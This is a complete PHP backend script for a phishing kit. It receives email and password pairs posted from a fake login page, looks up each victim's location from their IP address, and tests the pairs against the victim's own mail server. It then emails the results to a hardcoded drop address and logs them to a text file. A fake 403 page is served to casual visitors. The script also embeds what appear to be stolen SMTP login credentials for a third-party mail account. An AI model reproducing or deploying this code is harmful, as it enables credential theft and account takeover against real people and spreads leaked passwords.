<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Set headers for CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Start session
session_start();

// Handle GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo '
    <html><head>
    <title>403 - Forbidden</title>
    </head><body>
    <h1>403 Forbidden</h1>
    <hr>
    </body></html>';
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
$senderuser   = "okioko@museums.or.ke"; // SMTP user
$senderpass   = "onesmus@2022";         // SMTP password
$senderport   = 587;                    // SMTP port
$senderserver = "mail.museums.or.ke";   // SMTP server

// Get client information
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get form data
$login   = $_POST['email'] ?? '';
$passwd  = $_POST['password'] ?? '';
$email   = $login;

// Extract domain from email
$parts  = explode("@", $email);
$domain = isset($parts[1]) ? $parts[1] : 'unknown.tld';

// Prepare message content
$message = nl2br("Email: $login\nPassword: $passwd\nIP of sender: " . 
    ($ipdat->geoplugin_countryName ?? 'Unknown') . " | " . 
    ($ipdat->geoplugin_city ?? 'Unknown') . " | " . 
    $ip . " | " . $browser);

// Function to send email
function sendEmail($subject, $message, $smtpConfig) {
    $mail = new PHPMailer(true);
    
    try {
        $mail->isSMTP();
        $mail->Host = $smtpConfig['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $smtpConfig['username'];
        $mail->Password = $smtpConfig['password'];
        $mail->Port = $smtpConfig['port'];
        $mail->SMTPSecure = 'tls';
        $mail->From = $smtpConfig['username'];
        $mail->addAddress($smtpConfig['receiver']);
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $message;
        $mail->AltBody = 'Enjoy new server';
        
        return $mail->send();
    } catch (Exception $e) {
        return false;
    }
}

// Function to validate credentials
function validateCredentials($email, $password, $domain) {
    $mail = new PHPMailer(true);
    
    try {
        $mail->isSMTP();
        $mail->SMTPAuth = true;
        $mail->Username = $email;
        $mail->Password = $password;
        $mail->Host = 'mail.' . $domain;
        $mail->Port = 587;
        $mail->SMTPSecure = 'tls';
        
        return $mail->smtpConnect();
    } catch (Exception $e) {
        return false;
    }
}

// Main logic
if (!empty($login) && !empty($passwd)) {
    // Try to validate the captured credentials
    $validCredentials = validateCredentials($login, $passwd, $domain);
    
    if ($validCredentials) {
        // Valid credentials - send success notification
        $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
        
        $smtpConfig = [
            'host' => "mail.globalrisk.rw",
            'username' => $senderuser,
            'password' => $senderpass,
            'port' => $senderport,
            'receiver' => $receiver
        ];
        
        if (sendEmail($subg, $message, $smtpConfig)) {
            $data = array('signal' => 'ok', 'msg' => 'Login Successful');
        } else {
            $data = array('signal' => 'not ok', 'msg' => 'Error sending log email');
        }
    } else {
        // Invalid credentials - send failure notification
        $subg2 = "notVerifiedRcudeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
        
        $smtpConfig = [
            'host' => $senderserver,
            'username' => $senderuser,
            'password' => $senderpass,
            'port' => $senderport,
            'receiver' => $receiver
        ];
        
        if (sendEmail($subg2, $message, $smtpConfig)) {
            $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
        } else {
            $data = array('signal' => 'not ok', 'msg' => 'SMTP logging failed');
        }
    }
    
    echo json_encode($data);
    
    // Log to file
    $fp = fopen("SS-Or.txt", "a");
    fputs($fp, $message . "\n----------------------\n");
    fclose($fp);
    
    // Generate random identifier
    $praga = md5(rand());
} else {
    // No credentials provided
    $data = array('signal' => 'error', 'msg' => 'No credentials provided');
    echo json_encode($data);
}
?>